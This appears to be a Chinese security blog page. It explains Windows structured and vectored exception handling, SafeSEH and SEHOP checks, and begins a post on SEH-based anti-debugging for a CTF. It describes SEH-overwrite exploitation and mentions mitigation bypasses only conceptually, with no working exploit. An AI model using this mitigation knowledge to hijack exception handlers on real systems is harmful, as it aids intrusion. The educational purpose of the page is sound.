<p>Next指向了下一个SEH节点，而Handler实际上就是我们具体的来处理该异常的函数了，我们也把它叫做异常处理回调函数。如果大家还记得数据结构的知识的话很显然这就是个简单的链表，而该链表只允许在头节点来进行删除和增添操作，且FS的0一直指向头节点，这就说明，越新的函数越接近头节点，系统会维护链表最后的next指向0xFFFFFFFF，回调函数的模版如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">                        <span class="keyword">void</span> * EstablisherFrame,</span><br><span class="line">                        struct _CONTEXT *ContextRecord,</span><br><span class="line">                        <span class="keyword">void</span> * DispatcherContext);</span><br></pre></td></tr></table></figure>
<h3 id="SEH安装"><a href="#SEH安装" class="headerlink" title="SEH安装"></a>SEH安装</h3><p>通过之前的讲解我们可以知道SEH是基于线程的一种处理机制，而它又依赖于栈进行存储和查找，所以也被称作是基于栈帧的异常处理机制。在windows操作系统下的基础栈布局如下所示</p>
<p><img src="https://ws2.sinaimg.cn/large/006tKfTcly1g1iohrp7o5j30j80o00tk.jpg" alt="image-20190328182029909"></p>
<p>通过这样的布局我们也可以推断出来，SEH的装载甚至还在函数的序言之前，具体的装载代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push offset SEHandler</span><br><span class="line">push fs:[0]</span><br><span class="line">mov fs:[0],esp</span><br></pre></td></tr></table></figure>
<p>先向栈中压入了Handler和当前的节点，他们就又构成了一个EXCEPTION_REGISTRATION_RECORD结构，而esp指向栈顶，正好就是新的EXCEPTION_REGISTRATION_RECORD，将它付给fs:[0]也就是让SEH的头节点变成了刚刚加入的新节点。</p>
<p>卸载过程其实就是恢复栈平衡，代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,dword ptr fs:[0]</span><br><span class="line">pop dword ptr fs:[0]</span><br></pre></td></tr></table></figure>
<p>要注意，SEH异常的安装实际上从main函数之前就开始了，当我们在启动一个进程时，实际的启动位置也就是kernel!32BaseProcessStartThunk，而在这个函数内就已经开始有try、catch结构了，线程的启动函数kernel!32BaseThreadStart也是如此</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">BaseThreadStart</span><span class="params">(PTHREAD_START_ROUTINE pfnStartAddr, PVOID pvParam)</span> </span>&#123;</span><br><span class="line">	__try&#123;</span><br><span class="line">		ExitThread((pfnStartAddr)(pvParam));</span><br><span class="line">	&#125;</span><br><span class="line">	__except (UnhandledExceptionFilter(GetExceptionInformation()))&#123;</span><br><span class="line">		ExitProcess(GetExceptionCode());</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上这里的try catch结构构成的异常回调函数就是常说的top level，即顶层异常处理，它们也是SEH链的最后一部分，并且可以看到，它们的except还存在一个叫做UnhandledFilter函数，和字面上的意思相似，这是用来实现异常过滤的函数，这是非常重要的一个函数，我们后面会细讲。</p>
<p>###RltDispatchExeption</p>
<p>当我们的异常分发到了RtlDispatchException函数时，就会根据线程注册的SEH来处理该异常，之前的处理实际上都是简单的”打包”和”描述”的过程，到了这一步才开始真正的异常处理。为了个更好的理解这个过程，这里笔者给出了简化版的RltDispatchExeption伪代码，简单描绘一下该函数的执行过程，伪代码由笔者根据逆向和资料自行编写，有错误之处还望大家指出</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">if VEH异常处理例程 != Exception_continue_search</span><br><span class="line">	goto end_func</span><br><span class="line">	</span><br><span class="line">else</span><br><span class="line">	limit = 栈的limit</span><br><span class="line">	seh = 借助FS寄存器获取SEH的头节点</span><br><span class="line">	while(seh!=-1):</span><br><span class="line">		if SEH节点不在栈中 || SEH节点位置没有按ULONG对齐 || Handler在栈中</span><br><span class="line">			goto end_func</span><br><span class="line">		else</span><br><span class="line">			seh = 当前seh指向的下一个seh</span><br><span class="line">	seh = 借助FS寄存器获取SEH的头节点</span><br><span class="line">	while(seh!=-1):</span><br><span class="line">		if(检查safeseh)</span><br><span class="line">			goto end_func</span><br><span class="line">		else</span><br><span class="line">			return_value = 执行该seh的handler</span><br><span class="line">			switch(return_value):</span><br><span class="line">				case 处理成功:</span><br><span class="line">					flag=1</span><br><span class="line">					goto end_func</span><br><span class="line">				case 没法处理:</span><br><span class="line">					seh = 当前seh指向的下一个seh</span><br><span class="line">				case 处理时再次遭遇异常</span><br><span class="line">					设置标记，做内嵌异常处理</span><br><span class="line">					goto	end_func</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">end_func:</span><br><span class="line">	调用VEH的continue handler</span><br><span class="line">	return</span><br></pre></td></tr></table></figure>
<p>函数执行过程中实际上大部分的代码都是在对SEH机制进行检查，其主要包括了SEHOP和SafeSEH等，这里先暂且略过，在后面会放在一起讲。除去检查外，我们可以概括步骤如下：</p>
<ul>
<li>调用VEH ExceptionHandler进行处理，成功则结束，否则进行SEH</li>
<li><p>遍历SEH节点，对每一个Handler进行RtlExceptionHandlerForException，根据返回值执行不同操作</p>
<ul>
<li>ExceptionContinueExecution，表示异常已经被处理过了，接下来就可以回到之前的异常现场（借助之前讲过的Context）再执行试试了。但是这里就有两个重要的问题了，我们的回调函数真的成功处理了这个异常吗？我们的context被修改了怎么办？第一个问题的很简单 —— 不知道，系统是很”傻”的，只要你返回了这个值它就认为你成功了，而如果你压根就没处理还返回就会造成下次再执行还是错的，还是触发异常处理，进而陷入无限处理这个异常的循环状态。 第二个问题更简单了，被修改就完蛋了，不但异常没处理好，还搞出来个任意地址返回</li>
<li>ExceptionContinueSearch，表示这个节点的handler处理不了这个异常，此时就会借助Next指针去寻找下一个节点接着去处理</li>
<li>ExceptionNestedException，这个是最让人无奈的，意思是处理异常时又引发了一个新的异常，如果是内核态遇到了这个问题就直接game over蓝屏了，如果是用户态的话就成了”嵌套”异常，也就是会在此处再次进行异常处理</li>
<li>ExceptionCollidedUnwind，这个和上面的类似，不过上面是异常处理时遇到了麻烦，而这个是在恢复现场的时候遇到了不测，这个”恢复现场”的过程也叫做展开，下面会具体说明。这个结果非常罕见，因为恢复现场的工作时系统来完成的，处理得非常严谨。</li>
</ul>
</li>
<li><p>调用VEH ContinueHandler进行处理</p>
</li>
</ul>
<h3 id="栈展开"><a href="#栈展开" class="headerlink" title="栈展开"></a>栈展开</h3><p>在SEH的处理体系中，如果所有的异常回调函数都无法处理某个异常时，系统会让发生异常的线程中所有的回调函数一个执行的机会，主要是为了实现清理、释放资源，保存异常的信息等功能，这也就是栈展开的基本概念，下面我们具体来看一下它。</p>
<p>还记得上一篇文中提到的EXCEPTION_RECORD结构吗？它有个ExceptionFLags的标志位，我们之前没有仔细提，实际上它就会在这里发挥作用，0代表着可修复的异常，1表示不可修复的异常，2则表示展开操作，通常在用户态的异常不会涉及到1，一般是在异常嵌套或者是内核异常时会用到。当某个异常遍历完SEH链后依然没有能够执行的话，就会将该标志位置为2，并将ExceptionCode设置为ST0ATUS_UNWIND，来执行栈展开操作。</p>
<p>RtlUnwind函数通常用来实现该功能，其函数原型如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RtlUnwind(EXCEPTION_REGISTRATION VirtualTargetFrame,INT * TargetPC,EXCEPTION_RECORD ExceptionRecord,INT ReturnValue)</span><br></pre></td></tr></table></figure>
<ul>
<li>VirtualTargetFrame指向的是SEH链的EXECEPTION_REGISTRATION结构，表示要在哪个节点停止并进行展开操作</li>
<li><p>TargetPC是调用RtlUnwind后的返回地址，如果是0则直接跳转至下一条指令</p>
</li>
<li><p>Exception_record，当前异常的EXCEPTION_RECORD结构</p>
</li>
</ul>
<p>因为栈展开的详细过程较难理解且过于复杂，有兴趣的读者可以自行搜索相关资料学习</p>
<h3 id="UnhandledExceptionFilter函数"><a href="#UnhandledExceptionFilter函数" class="headerlink" title="UnhandledExceptionFilter函数"></a>UnhandledExceptionFilter函数</h3><p>未处理异常过滤函数，简称为UEF函数，这可以说是异常处理的最后一道防线了，他也是异常处理和windows error report交接的关键，首先来看看这个函数的大致流程</p>
<ul>
<li><p>错误的预处理，主要是对三个方面的检查：</p>
<ul>
<li>是否存在着嵌套异常？上面说过了嵌套异常是一种非常难处理的情况，如果处理的不好就很难再恢复原始的状态了，于是这种情况下UEF函数会直接调用NtTerminateProcess结束当前的进程</li>
<li>是否是违例访问？还记得我们上一次windbg分析格蠹汇编的练习题吗？出现了0xc0000005的错误码，这就是EXCEPTION_ACCESS_VIOLATION，也就是所谓的违例访问。这种情况下UEF函数会尝试去通过更改页属性的方式去修复错误，当然如果你访问的是绝对不该访问的页，那UEF就无法解决了。</li>
<li>DebugPort有没有？DebugPort在异常分发的过程中起到了标志着调试器是否开启的任务，一旦UEF检测到了DebugPort那它就不会处理该异常，而是返回一个ExceptionContinueSearch，而它作为最后的异常处理也没有处理该异常的话自然也就进入了第二次的异常分发，成功使调试器接手该异常</li>
</ul>
</li>
<li><p>进行最终处理的处理</p>
<ul>
<li><p>根据程序的设置直接结束进程。windows提供了SetErrorMode的api用来设置某个标志位，一旦设置了，那那就不会出现任何的错误提示，程序直接结束。判断当前进程是否在job（以后会详细总结）中，如果在而且设置了未处理异常时直接结束，那就直接杀掉进程。</p>
</li>
<li><p>查看是否设置了JIT调试，如果是就开始进行调试。在上一章里我们实际设置并借助JIT进行了分析，实际上JIT的响应就是发生在UEF函数中的</p>
</li>
<li>弹出异常信息。此时程序会加载faultrep.all，调用ReportFault函数来汇报错误，如果设置了错误报告或者是非常严重的错误会弹出error窗口询问用户是否要发送错误报告，而其余情况下就会弹出我们熟知的application error</li>
</ul>
</li>
</ul>
<p>当然我们也可以设置自己的UEF函数，我们可以通过SetUnhandledExceptionFilter函数来设置，UEF会在上面说的两步之间执行我们自定义的代码，还可以根据具体的返回值在后面执行不同的操作，而这也就是之前提到的try 、catch构成的top level，顶层异常处理函数</p>
<p><img src="https://ws3.sinaimg.cn/large/006tKfTcly1g1lurzupb8j30u0112tkt.jpg" alt="image-20190331121435807"></p>
<p>​                                图片来自《windows核心编程》</p>
<h2 id="VEH"><a href="#VEH" class="headerlink" title="VEH"></a>VEH</h2><p>VEH（Vectored Exception Handling）也就是向量化异常处理，是windows在xp之后新加入的一种异常处理机制，我们在RltDispatchException已经看到过它在异常处理时的调用过程了，下面就看看它的具体实现流程。</p>
<p>首先VEH也需要注册回调函数，而且也同样是用链表的结构来维护的。注册函数的原型如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI PVOID WINAPI <span class="title">AddVectoredExceptionHandler</span><span class="params">(ULONG FirtstHandler,PVECTORED_EXCEPTION_HANDLER VectoreHandler)</span></span></span><br></pre></td></tr></table></figure>
<p>第一个参数是一个标志位，它用来标示注册的回调函数是在链表的头还是尾，0是插入尾部，非0则是插入头部，第二个参数是回调函数的地址，它会返回一个VectoredHandlerHandle，用于之后卸载回调函数。</p>
<p>回调函数的原型如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LONG CALLBACK <span class="title">Vectorhandler</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure>
<p>在RltDispatchException的过程中VEH将会优先于SEH调用，如果回调函数成功解决了问题和SEH相似，都会返回ExceptionContinueExecution表示异常处理完毕，然后借助CONTEXT的内容恢复上下文，跳过SEH继续执行程序，如果失败了就遍历VEH链表寻找解决方法，如果所有的回调函数都不能处理的话再将执行权归还，继续向下执行SEH的相关内容。</p>
<p>可能到这有人就有疑问了，这不就是SEH的翻版吗，为什么微软还要搞个这玩意？实际上这和SEH相比有很多的不同之处，它俩有着相似的”外表”，却有着不同的”内在”。</p>
<p>最明显的就是优先级的不同，这里的优先级有两个含义，一是VEH比起SEH更加优先调用，二是VEH可以自行设置回调函数的位置。一不必多说，VEH会调用得更早，二就很有意思了，我们已经知道了SEH会不管三七二十一把我们最后定义的异常回调函数放到链表头部，也就是说顺序被写死了，我们如果想让某个异常回调函数优先进行处理是不可能的，而VEH由于可以自定义插入的位置，我们就可以实现一定程度上的自定义处理顺序了。</p>
<p>其次可以看到VEH和SEH注册的原理是完全不同的，SEH最终落在了栈上，而实际上VEH保存在了ntdll中，这就又导致了SEH只能是针对某个线程进行异常处理（因为每个线程维护着自己的栈结构），而VEH则可以对整个进程进行处理。</p>
<p>最后VEH的收尾也要更加简单，SEH因为占用了栈空间，调用回调函数时会有栈展开的问题，处理非常复杂，而VEH和一般的函数无异了。</p>
<h2 id="异常的保护机制"><a href="#异常的保护机制" class="headerlink" title="异常的保护机制"></a>异常的保护机制</h2><p>我们已经详细了解了整个异常的执行流程，我们不难发现，以ntdll作为基础的VEH并不容易被我们利用，但以栈作为基础的SEH本身具有很大的危险性，我们可以利用各种手段对栈上SEH节点进行覆盖重写，再次执行异常处理操作时就会将执行权给到了我们用来覆盖的函数上，这实际上在以前是很常见的windows栈溢出手段，当然，除了这种方法外还有许许多多的利用手段，可见这样的异常处理机制还是不够完善的。为了解决这些问题，微软逐步加入了Safe SEH、SEHOP、VCH等来弥补。</p>
<h3 id="Safe-SEH"><a href="#Safe-SEH" class="headerlink" title="Safe SEH"></a>Safe SEH</h3><p>SafeSEH又叫做软件DEP，是一种在软件层面实现的对SEH的保护机制，它需要操作系统和编译器的双重支持，在vs2013及以后的版本中会自动启用 /SafeSEH 链接选项来使用SafeSEH。也正是因为该项技术使得以往简单的覆盖异常处理句柄的漏洞利用几乎失效了</p>
<p>在加载PE文件时，SafeSEH将定位合法的SEH表的地址（如果该映像不支持SafeSEH的话则地址为0），然后是用共享内存中的一个随机数进行加密处理，程序中所有的异常处理函数的地址提取出来汇总放入SEH表，并将该表放入程序映像中，还会将将加密后的SEH函数表地址，IMAGE的开始地址，IMAGE的长度，合法SEH函数的个数，作为一条记录放入ntdll（ntdll模块是进行异常分发的模块）的加载模块数据内存中,每次调用异常处理函数时都会进行校验，只有二者一致才能够正常进行，该处理由RtlDispatchException() 开始，首先会经历两次检查，分别是：</p>
<ul>
<li>检查异常处理链是否在当前的栈中，不是则终止</li>
<li>检查异常处理函数的指针是否指向栈，是则终止</li>
</ul>
<p>通过两次检查后会调用RtlIsValidHandler() 来进行异常的有效性检查，08年的black hat给出了该函数的细节</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">RtlIsValidHandler</span><span class="params">( handler )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (handler is in the loaded image)      <span class="comment">// 是否在loaded的空间内</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (image has <span class="built_in">set</span> the IMAGE_DLLCHARACTERISTICS_NO_SEH flag) <span class="comment">//是否设置了忽略异常</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;                  </span><br><span class="line">        <span class="keyword">if</span> (image has a SafeSEH table)       <span class="comment">// 是否含有SEH表</span></span><br><span class="line">            <span class="keyword">if</span> (handler found in the table)  <span class="comment">// 异常处理函数地址是否表中</span></span><br><span class="line">                <span class="keyword">return</span> TRUE;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                <span class="keyword">return</span> FALSE;</span><br><span class="line">        <span class="keyword">if</span> (image is a .NET assembly with the ILonl	y flag <span class="built_in">set</span>)</span><br><span class="line">            <span class="keyword">return</span> FALSE;                    </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is on non-executable page)   <span class="comment">// handler是否在不可执行页上</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ExecuteDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//DEP是否开启</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            raise ACCESS_VIOLATION;          </span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler is <span class="keyword">not</span> in an image)          <span class="comment">// handler是否在未加载空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ImageDispatchEnable bit <span class="built_in">set</span> in the process flags) <span class="comment">//设置的标志位是否允许</span></span><br><span class="line">            <span class="keyword">return</span> TRUE;                     </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;                             /s/ 允许执行异常处理函数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中的ExecuteDispatchEnable和ImageDispatchEnable位标志是内核KPROCESS结构的一部分，这两个位用来控制当异常处理函数在不可以执行内存或者不在异常模块的映像（IMAGE）内时，是否执行异常处理函数。这两个位的值可以在运行时修改，不过默认情况下如果进程的DEP被关闭，则这两个位置1，如果进程的DEP是开启状态，则这两个位被置0。</p>
<p>通过源码我们可以看出，RtlIsValidHandler() 函数只会在以下几种情况执行异常处理函数</p>
<ul>
<li>在进程的DEP是开启的情况下<ul>
<li>异常处理函数和进程映像的SafeSEH表匹配且没有NO_SEH标志。</li>
<li>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</li>
</ul>
</li>
<li>在进程的DEP关闭的情况下<ul>
<li>异常处理函数和进程映像的SafeSEH表匹配没有NO_SEH标志。</li>
<li>异常处理函数在进程映像的可执行页，并且没有NO_SEH标志，没有SafeSEH表，没有.NET的ILonly标志。</li>
<li>异常处理函数不在当前进程的映像里面，但是不在当前线程的堆栈上。</li>
</ul>
</li>
</ul>
<h3 id="SEHOP"><a href="#SEHOP" class="headerlink" title="SEHOP"></a>SEHOP</h3><p>全称为Structured Exception Handler Overwrite Protection（结构化异常处理覆盖保护），这是专门用来检测SEH是否被劫持的一项技术，我们在上面的RltDispatchExeption实际上已经提到过一些SEHOP的检测过程了，这里我们来具体说一说</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel</span><br></pre></td></tr></table></figure>
<p>你可以在该表项下找到DisableExceptionChainValidation的键，它标示着你的计算机是否开启了该功能。</p>
<p>我们再次回到RltDispatchExeption来看看它的具体操作，代码来自Vistasp1</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Skip the chain validation if the DisableExceptionChainValidation bit is set</span></span><br><span class="line"><span class="keyword">if</span> (process_flags &amp; <span class="number">0x40</span> == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// Skip the validation if there are no SEH records on the linked list</span></span><br><span class="line">	<span class="keyword">if</span> (record != <span class="number">0xFFFFFFFF</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// Walk the SEH linked list</span></span><br><span class="line">		<span class="keyword">do</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// 1、The record must be on the stack</span></span><br><span class="line">			<span class="keyword">if</span> (record &lt; stack_bottom || record &gt; stack_top)</span><br><span class="line">				<span class="keyword">goto</span> corruption;</span><br><span class="line"> </span><br><span class="line">			<span class="comment">// 2、The end of the record must be on the stack</span></span><br><span class="line">			<span class="keyword">if</span> ((<span class="keyword">char</span>*)record + <span class="keyword">sizeof</span>(EXCEPTION_REGISTRATION) &gt; stack_top)</span><br><span class="line">				<span class="keyword">goto</span> corruption;</span><br><span class="line"> </span><br><span class="line">			<span class="comment">// 3、The record must be 4 byte aligned</span></span><br><span class="line">			<span class="keyword">if</span> ((record &amp; <span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">				<span class="keyword">goto</span> corruption;</span><br><span class="line"> </span><br><span class="line">			handler = record-&gt;handler;</span><br><span class="line">			<span class="comment">// 4、The handler must not be on the stack</span></span><br><span class="line">			<span class="keyword">if</span> (handler &gt;= stack_bottom &amp;&amp; handler &lt; stack_top)</span><br><span class="line">				<span class="keyword">goto</span> corruption;</span><br><span class="line"> </span><br><span class="line">			record = record-&gt;next;</span><br><span class="line">		&#125; <span class="keyword">while</span> (record != <span class="number">0xFFFFFFFF</span>);</span><br><span class="line"> </span><br><span class="line">		<span class="comment">// End of chain reached</span></span><br><span class="line">		<span class="comment">// Is bit 9 set in the TEB-&gt;SameTebFlags field? This bit is set in</span></span><br><span class="line">		<span class="comment">// ntdll!RtlInitializeExceptionChain, which registers</span></span><br><span class="line">		<span class="comment">// FinalExceptionHandler as an SEH handler when a new thread starts.</span></span><br><span class="line">		<span class="keyword">if</span> ((TEB-&gt;word_at_offset_0xFCA &amp; <span class="number">0x200</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="comment">// 5、The final handler must be ntdll!FinalExceptionHandler</span></span><br><span class="line">			<span class="keyword">if</span> (handler != &amp;FinalExceptionHandler)</span><br><span class="line">				<span class="keyword">goto</span> corruption;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="comment">// end if (record != 0xFFFFFFFF)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>大家可自行阅读代码，概括来说主要是对以下几点的检测：</p>
<ul>
<li>SEH节点必须在栈上</li>
<li>SEH节点的Handle必须不在栈上</li>
<li>最后的SEH节点的Handle必须是ntdll!FinalExceptionHandler，也就是咱们上面说的异常的最后一站</li>
<li>最后的SEH节点的Next指针必须为0xffffffff</li>
</ul>
<p>可以看到SEHOP的防御十分的严格，但并不代表它就一定安全了，我们还是可以通过各种手段进行绕过，关于如何绕过的内容在以后的《windows调试艺术》中还会有，这里就先不展开了。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/28/Windows调试艺术——断点、异常、反调试/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Asa9ao">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Asa9ao">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/05/28/Windows调试艺术——断点、异常、反调试/" itemprop="url">Windows调试艺术——断点和反调试（上）</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-28T11:18:06+08:00">
                2019-05-28
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
                  <a href="/categories/Windows调试艺术/" itemprop="url" rel="index">
                    <span itemprop="name">Windows调试艺术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>文章在360的安全客上首发，搬运到自己博客上来，可以去安全客查看详细博文。</p>
<h1 id="Windows调试艺术——断点和反调试（上）"><a href="#Windows调试艺术——断点和反调试（上）" class="headerlink" title="Windows调试艺术——断点和反调试（上）"></a>Windows调试艺术——断点和反调试（上）</h1><p>《Windows调试艺术》主要是记录我自己学习的windows知识，并希望尽可能将这些东西在某些实际方面体现出来。恰好最近我在为学校的新生校赛出题，想着来个反调试的”大杂烩”，里面有几个反调试技术恰好是基于前面几篇的内容，这一次我们就将之前学习过的PEB、SEH等等的知识用到反调试的实际应用上。</p>
<p>需要的知识基础：</p>
<ul>
<li><a href="https://www.anquanke.com/post/id/173586" target="_blank" rel="noopener">Windows调试艺术——利用LDR寻找dll基址</a></li>
<li><a href="https://www.anquanke.com/post/id/175293" target="_blank" rel="noopener">Windows调试艺术——从0开始的异常处理（上）</a></li>
<li><a href="https://www.anquanke.com/post/id/175753" target="_blank" rel="noopener">Windows调试艺术——从0开始的异常处理（下）</a></li>
</ul>
<p>##基于中断、异常的反调试</p>
<h3 id="利用SEH和软件断点机制实现反调试"><a href="#利用SEH和软件断点机制实现反调试" class="headerlink" title="利用SEH和软件断点机制实现反调试"></a>利用SEH和软件断点机制实现反调试</h3><p><img src="https://ws4.sinaimg.cn/large/006tNc79ly1g24nd970ucj30ue0c8jru.jpg" alt="image-20190416182359363">首先简单回忆一下SEH的处理，当用户引发了一个异常时，程序会遍历当前线程的SEH链表来检查能否处理该异常，如果能，就将该异常交给异常处理例程进行处理，并在处理完成后重新执行异常代码。SEH链表的头部保存在FS:[0]中，越晚设置的SEH越早处理，我们可以用以下的代码装载自己的SEH</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push seh										//将自己的SEH函数地址压栈</span><br><span class="line">push DWORD ptr fs : [0]			//将之前的SEH头压栈</span><br><span class="line">mov DWORD ptr fs : [0], esp	//esp指向的地方恰好构成了新的EXCEPTION_REGISTRATION_RECORD</span><br></pre></td></tr></table></figure>
<p>再来回忆一下断点的知识，我们的od下的软件断点，实际上是将下断点处的指令替换为0xCC（也就是INT 3），当程序跑到这里，发现这是个异常，然后根据IDT（中断描述符表）去寻找相应的中断处理例程，再经过异常分发，从而实现断点的功能。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">假设在此处下断点</span><br><span class="line">C645 FC 00 mov byte ptr [ebp-4],0</span><br><span class="line">53 PUSH EBX</span><br><span class="line">断点后的指令应为</span><br><span class="line">CC int 3</span><br><span class="line">45 FC 00 被识别为其他指令</span><br><span class="line">53 PUSH EBX</span><br></pre></td></tr></table></figure>
<p>但是我们会发现，在使用od下断点时，指令在我们这边并没有看到改变，另外，我们下的断点处并没有执行。如果按照之前的理论的话这条指令由于被覆盖成了0xCC所以”废”了才对，指令不应该停留在此，之后应该直接去执行45 FC 00才对，而这又会引发一个新的问题，这个45 FC 00到底是不是个可以识别的指令，不是的话该怎么办，是的话程序逻辑错了怎么办？</p>
